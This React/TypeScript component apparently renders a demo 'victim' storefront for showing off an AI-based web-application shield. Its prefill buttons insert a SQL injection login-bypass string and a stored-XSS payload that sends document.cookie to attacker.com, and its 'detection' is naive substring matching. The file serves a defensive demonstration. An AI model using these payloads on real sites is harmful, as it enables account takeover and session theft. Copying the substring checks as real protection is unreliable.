'use client';

import React, { useState } from 'react';
import {
  ShoppingBag,
  ShoppingCart,
  LogIn,
  Search,
  Star,
  Check,
  Shield,
  ShieldAlert,
  AlertOctagon,
  ArrowRight,
  ExternalLink,
  MessageSquare,
} from 'lucide-react';
import { INITIAL_PRODUCTS, INITIAL_REVIEWS } from '../lib/mockData';
import { executeSimulatedRequest } from '../lib/api';
import { Product, ProductReview } from '../lib/types';

export default function StorefrontPreview() {
  const [currentPage, setCurrentPage] = useState<'store' | 'login'>('store');
  const [useShield, setUseShield] = useState<boolean>(true);
  const [activeCategory, setActiveCategory] = useState<string>('all');
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [cart, setCart] = useState<{ product: Product; quantity: number }[]>([]);
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [reviews, setReviews] = useState<ProductReview[]>(INITIAL_REVIEWS);

  // Login form state
  const [username, setUsername] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [loginNotification, setLoginNotification] = useState<{
    type: 'success' | 'error' | 'shield_blocked';
    message: string;
    details?: string;
  } | null>(null);

  // Review form state
  const [newReviewText, setNewReviewText] = useState<string>('');
  const [newReviewRating, setNewReviewRating] = useState<number>(5);
  const [reviewNotification, setReviewNotification] = useState<{
    type: 'success' | 'shield_blocked';
    message: string;
  } | null>(null);

  const filteredProducts = INITIAL_PRODUCTS.filter((p) => {
    if (activeCategory !== 'all' && p.category !== activeCategory) return false;
    if (searchQuery.trim() && !p.name.toLowerCase().includes(searchQuery.toLowerCase())) {
      return false;
    }
    return true;
  });

  const addToCart = (product: Product) => {
    setCart((prev) => {
      const existing = prev.find((item) => item.product.id === product.id);
      if (existing) {
        return prev.map((item) =>
          item.product.id === product.id ? { ...item, quantity: item.quantity + 1 } : item
        );
      }
      return [...prev, { product, quantity: 1 }];
    });
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoginNotification(null);

    const isSqlInjection = username.includes("' OR '1'='1'") || password.includes("' OR '1'='1'");

    const res = await executeSimulatedRequest(
      '/api/login',
      'POST',
      { username, password },
      useShield
    );

    if (useShield && isSqlInjection) {
      setLoginNotification({
        type: 'shield_blocked',
        message: '403 FORBIDDEN — BLOCKED BY AI GATEWAY SHIELD',
        details: 'Deep Autoencoder & CNN+BiLSTM detected SQL syntax injection in the login vector. IP flagged.',
      });
    } else if (!useShield && isSqlInjection) {
      setLoginNotification({
        type: 'error',
        message: '🚨 CRITICAL VULNERABILITY EXPLOITED! (Auth Bypass Succeeded)',
        details: 'PostgreSQL evaluated: WHERE username = \'admin\' OR \'1\'=\'1\' -- and authenticated with Administrator privileges without password!',
      });
    } else if (username === 'user1' && password === 'password123') {
      setLoginNotification({
        type: 'success',
        message: 'Legitimate customer login successful. Welcome user1!',
      });
    } else {
      setLoginNotification({
        type: 'error',
        message: 'Invalid credentials. Please verify your login.',
      });
    }
  };

  const handleReviewSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newReviewText.trim() || !selectedProduct) return;

    const isXss = newReviewText.includes('<script');

    const res = await executeSimulatedRequest(
      `/api/products/${selectedProduct.id}/reviews`,
      'POST',
      { rating: newReviewRating, comment: newReviewText },
      useShield
    );

    if (useShield && isXss) {
      setReviewNotification({
        type: 'shield_blocked',
        message: '403 FORBIDDEN — XSS Vector Intercepted and Dropped by Shield.',
      });
    } else {
      const added: ProductReview = {
        id: Date.now(),
        product_id: selectedProduct.id,
        user_id: 99,
        username: 'Guest_User',
        rating: newReviewRating,
        comment: newReviewText,
        created_at: new Date().toLocaleTimeString(),
      };
      setReviews((prev) => [added, ...prev]);
      setNewReviewText('');
      setReviewNotification({
        type: 'success',
        message: isXss
          ? '🚨 Stored XSS script executed into page DOM (Unprotected Backend)!'
          : 'Review successfully submitted.',
      });
    }
  };

  return (
    <div className="glass-panel" style={{ padding: '1.5rem', marginBottom: '1.5rem' }}>
      {/* Route Switcher & Storefront Banner */}
      <div
        style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          flexWrap: 'wrap',
          gap: '1rem',
          paddingBottom: '1rem',
          marginBottom: '1.25rem',
          borderBottom: '1px solid var(--border-subtle)',
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.85rem' }}>
          <div
            style={{
              width: '38px',
              height: '38px',
              borderRadius: 'var(--radius-md)',
              background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.25), rgba(59, 130, 246, 0.25))',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}
          >
            <ShoppingBag size={20} color="#10b981" />
          </div>

          <div>
            <h2 style={{ fontSize: '1.1rem', color: '#fff', fontWeight: 700 }}>
              Victim Application — Aurora Storefront (:8081)
            </h2>
            <span style={{ fontSize: '0.74rem', color: 'var(--text-dim)' }}>
              Interactive Target Environment • 2-Page E-Commerce Demonstration
            </span>
          </div>
        </div>

        {/* Protection Mode Toggle */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
          <div
            className="status-pill"
            style={{
              background: useShield ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)',
              borderColor: useShield ? 'rgba(16, 185, 129, 0.4)' : 'rgba(239, 68, 68, 0.4)',
              color: useShield ? '#6ee7b7' : '#fca5a5',
            }}
          >
            {useShield ? <Shield size={14} /> : <AlertOctagon size={14} />}
            <span>
              {useShield ? 'TRAFFIC ROUTE: VIA AI SHIELD (:8080)' : 'TRAFFIC ROUTE: DIRECT UNPROTECTED (:8081)'}
            </span>
          </div>

          <button
            className={useShield ? 'btn-danger' : 'btn-primary'}
            onClick={() => setUseShield(!useShield)}
            style={{ fontSize: '0.76rem', padding: '0.4rem 0.8rem' }}
          >
            {useShield ? 'Switch to Direct Target (Disable Shield)' : 'Activate AI Shield Gateway'}
          </button>
        </div>
      </div>

      {/* Store Navigation Bar */}
      <div
        style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          flexWrap: 'wrap',
          gap: '1rem',
          marginBottom: '1.25rem',
          background: 'rgba(255, 255, 255, 0.02)',
          padding: '0.65rem 1rem',
          borderRadius: 'var(--radius-md)',
          border: '1px solid var(--border-subtle)',
        }}
      >
        <div style={{ display: 'flex', gap: '0.45rem' }}>
          <button
            className={`nav-tab-btn ${currentPage === 'store' ? 'active' : ''}`}
            onClick={() => setCurrentPage('store')}
          >
            <ShoppingBag size={14} />
            <span>Storefront Catalog</span>
          </button>

          <button
            className={`nav-tab-btn ${currentPage === 'login' ? 'active' : ''}`}
            onClick={() => setCurrentPage('login')}
          >
            <LogIn size={14} />
            <span>Customer Authentication / Login</span>
          </button>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
          {currentPage === 'store' && (
            <div className="search-input-wrap">
              <Search size={14} className="search-icon" />
              <input
                type="text"
                placeholder="Search products..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="search-input"
                style={{ width: '200px' }}
              />
            </div>
          )}

          <div
            className="status-pill"
            style={{ background: 'rgba(255, 255, 255, 0.05)', color: '#fff' }}
          >
            <ShoppingCart size={14} color="#60a5fa" />
            <span>Cart: {cart.reduce((a, b) => a + b.quantity, 0)} items</span>
          </div>
        </div>
      </div>

      {/* PAGE 1: STOREFRONT VIEW */}
      {currentPage === 'store' && (
        <div>
          {/* Category Filter Chips */}
          <div style={{ display: 'flex', gap: '0.4rem', marginBottom: '1.25rem', flexWrap: 'wrap' }}>
            {['all', 'electronics', 'clothing', 'books', 'home'].map((cat) => (
              <button
                key={cat}
                onClick={() => setActiveCategory(cat)}
                className={`filter-btn ${activeCategory === cat ? 'active' : ''}`}
                style={{ textTransform: 'capitalize' }}
              >
                {cat}
              </button>
            ))}
          </div>

          {/* Product Cards Grid */}
          <div className="store-product-grid">
            {filteredProducts.map((p) => (
              <div key={p.id} className="store-product-card">
                <div>
                  <div className="product-image-box">{p.image}</div>

                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '0.35rem' }}>
                    <h4 style={{ color: '#fff', fontSize: '0.92rem', fontWeight: 600 }}>
                      {p.name}
                    </h4>
                    <span className="font-mono" style={{ color: '#10b981', fontWeight: 700, fontSize: '0.92rem' }}>
                      ${p.price.toFixed(2)}
                    </span>
                  </div>

                  <p style={{ fontSize: '0.74rem', color: 'var(--text-muted)', lineHeight: '1.4', marginBottom: '0.75rem' }}>
                    {p.description}
                  </p>
                </div>

                <div style={{ display: 'flex', gap: '0.45rem', marginTop: '0.75rem' }}>
                  <button
                    className="btn-primary"
                    style={{ flex: 1, padding: '0.45rem 0.65rem' }}
                    onClick={() => addToCart(p)}
                  >
                    <ShoppingCart size={13} />
                    <span>Add to Cart</span>
                  </button>

                  <button
                    className="btn-secondary"
                    style={{ padding: '0.45rem 0.65rem' }}
                    onClick={() => setSelectedProduct(p)}
                    title="View reviews and customer feedback"
                  >
                    <MessageSquare size={13} />
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* PAGE 2: LOGIN VIEW (With SQLi Demo Sandbox) */}
      {currentPage === 'login' && (
        <div style={{ maxWidth: '520px', margin: '0 auto', padding: '1.5rem 0' }}>
          <div
            style={{
              background: '#0a0f1d',
              border: '1px solid var(--border-subtle)',
              borderRadius: 'var(--radius-xl)',
              padding: '2rem',
            }}
          >
            <h3 style={{ fontSize: '1.25rem', color: '#fff', marginBottom: '0.35rem', textAlign: 'center' }}>
              Aurora Storefront Sign In
            </h3>
            <p style={{ fontSize: '0.76rem', color: 'var(--text-dim)', textAlign: 'center', marginBottom: '1.5rem' }}>
              Authentication endpoint: <span className="font-mono" style={{ color: '#93c5fd' }}>POST /api/login</span>
            </p>

            {/* Quick Demo Pre-fill Buttons */}
            <div
              style={{
                marginBottom: '1.25rem',
                padding: '0.75rem',
                background: 'rgba(255, 255, 255, 0.02)',
                border: '1px solid var(--border-subtle)',
                borderRadius: 'var(--radius-md)',
              }}
            >
              <div style={{ fontSize: '0.72rem', color: 'var(--text-dim)', marginBottom: '0.45rem', textTransform: 'uppercase' }}>
                Quick Demo Scenario Fill:
              </div>
              <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
                <button
                  type="button"
                  className="btn-secondary"
                  style={{ fontSize: '0.72rem', padding: '0.35rem 0.65rem' }}
                  onClick={() => {
                    setUsername('user1');
                    setPassword('password123');
                  }}
                >
                  👤 Legitimate Customer (user1)
                </button>

                <button
                  type="button"
                  className="btn-danger"
                  style={{ fontSize: '0.72rem', padding: '0.35rem 0.65rem' }}
                  onClick={() => {
                    setUsername("admin' OR '1'='1' --");
                    setPassword('anything');
                  }}
                >
                  ⚡ SQLi Auth Bypass (admin&apos; OR &apos;1&apos;=&apos;1&apos; --)
                </button>
              </div>
            </div>

            <form onSubmit={handleLoginSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
              <div>
                <label style={{ display: 'block', fontSize: '0.76rem', color: 'var(--text-muted)', marginBottom: '0.35rem' }}>
                  Username / Identifier
                </label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="e.g. admin' OR '1'='1' --"
                  className="search-input font-mono"
                  style={{ width: '100%', padding: '0.55rem 0.75rem' }}
                  required
                />
              </div>

              <div>
                <label style={{ display: 'block', fontSize: '0.76rem', color: 'var(--text-muted)', marginBottom: '0.35rem' }}>
                  Password
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter password"
                  className="search-input font-mono"
                  style={{ width: '100%', padding: '0.55rem 0.75rem' }}
                  required
                />
              </div>

              <button
                type="submit"
                className={useShield ? 'btn-primary' : 'btn-danger'}
                style={{ padding: '0.65rem', justifyContent: 'center', marginTop: '0.5rem' }}
              >
                <span>{useShield ? 'Authenticate through AI Shield (:8080)' : 'Submit Direct to Vulnerable Backend (:8081)'}</span>
                <ArrowRight size={14} />
              </button>
            </form>

            {/* Notification Result Box */}
            {loginNotification && (
              <div
                style={{
                  marginTop: '1.25rem',
                  padding: '0.85rem',
                  borderRadius: 'var(--radius-md)',
                  background:
                    loginNotification.type === 'shield_blocked'
                      ? 'rgba(16, 185, 129, 0.15)'
                      : loginNotification.type === 'success'
                      ? 'rgba(59, 130, 246, 0.15)'
                      : 'rgba(239, 68, 68, 0.2)',
                  border: `1px solid ${
                    loginNotification.type === 'shield_blocked'
                      ? '#10b981'
                      : loginNotification.type === 'success'
                      ? '#3b82f6'
                      : '#ef4444'
                  }`,
                }}
              >
                <div
                  style={{
                    fontWeight: 700,
                    fontSize: '0.82rem',
                    color:
                      loginNotification.type === 'shield_blocked'
                        ? '#6ee7b7'
                        : loginNotification.type === 'success'
                        ? '#93c5fd'
                        : '#fca5a5',
                    marginBottom: '0.25rem',
                  }}
                >
                  {loginNotification.message}
                </div>
                {loginNotification.details && (
                  <p style={{ fontSize: '0.74rem', color: '#e2e8f0', lineHeight: 1.4 }}>
                    {loginNotification.details}
                  </p>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Product Reviews & Stored XSS Modal */}
      {selectedProduct && (
        <div className="modal-overlay" onClick={() => setSelectedProduct(null)}>
          <div className="modal-card" style={{ maxWidth: '640px' }} onClick={(e) => e.stopPropagation()}>
            <h3 style={{ fontSize: '1.1rem', color: '#fff', marginBottom: '0.25rem' }}>
              Customer Reviews — {selectedProduct.name}
            </h3>
            <p style={{ fontSize: '0.74rem', color: 'var(--text-dim)', marginBottom: '1rem' }}>
              Endpoint: <span className="font-mono" style={{ color: '#93c5fd' }}>POST /api/products/{selectedProduct.id}/reviews</span>
            </p>

            {/* Submit New Review Form */}
            <form onSubmit={handleReviewSubmit} style={{ marginBottom: '1.25rem' }}>
              <div style={{ marginBottom: '0.65rem' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.35rem' }}>
                  <label style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>Write a Review</label>
                  <button
                    type="button"
                    className="btn-danger"
                    style={{ fontSize: '0.68rem', padding: '2px 6px' }}
                    onClick={() =>
                      setNewReviewText(
                        "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Incredible item!"
                      )
                    }
                  >
                    ⚡ Paste XSS Cookie Stealer
                  </button>
                </div>
                <textarea
                  value={newReviewText}
                  onChange={(e) => setNewReviewText(e.target.value)}
                  placeholder="Share your customer experience or test XSS payload..."
                  rows={3}
                  className="search-input font-mono"
                  style={{ width: '100%', padding: '0.55rem', resize: 'vertical' }}
                  required
                />
              </div>

              <button
                type="submit"
                className={useShield ? 'btn-primary' : 'btn-danger'}
                style={{ padding: '0.45rem 0.85rem' }}
              >
                <span>{useShield ? 'Post Review through Shield' : 'Post Directly (Vulnerable)'}</span>
              </button>
            </form>

            {reviewNotification && (
              <div
                style={{
                  padding: '0.65rem 0.85rem',
                  borderRadius: 'var(--radius-sm)',
                  marginBottom: '1rem',
                  background:
                    reviewNotification.type === 'shield_blocked'
                      ? 'rgba(16, 185, 129, 0.15)'
                      : 'rgba(239, 68, 68, 0.15)',
                  border: `1px solid ${
                    reviewNotification.type === 'shield_blocked' ? '#10b981' : '#ef4444'
                  }`,
                  color: reviewNotification.type === 'shield_blocked' ? '#6ee7b7' : '#fca5a5',
                  fontSize: '0.76rem',
                  fontWeight: 600,
                }}
              >
                {reviewNotification.message}
              </div>
            )}

            {/* Existing Reviews */}
            <div style={{ maxHeight: '240px', overflowY: 'auto' }}>
              {reviews.map((r) => (
                <div
                  key={r.id}
                  style={{
                    padding: '0.75rem',
                    background: 'rgba(255, 255, 255, 0.02)',
                    borderRadius: 'var(--radius-sm)',
                    marginBottom: '0.5rem',
                    border: '1px solid var(--border-subtle)',
                  }}
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.25rem' }}>
                    <span style={{ color: '#fff', fontSize: '0.8rem', fontWeight: 600 }}>
                      {r.username || 'Customer'}
                    </span>
                    <span style={{ color: '#f59e0b', fontSize: '0.75rem' }}>{'★'.repeat(r.rating)}</span>
                  </div>
                  <p style={{ color: '#cbd5e1', fontSize: '0.76rem', wordBreak: 'break-all' }}>
                    {r.comment}
                  </p>
                </div>
              ))}
            </div>

            <div style={{ textAlign: 'right', marginTop: '1rem' }}>
              <button className="btn-secondary" onClick={() => setSelectedProduct(null)}>
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
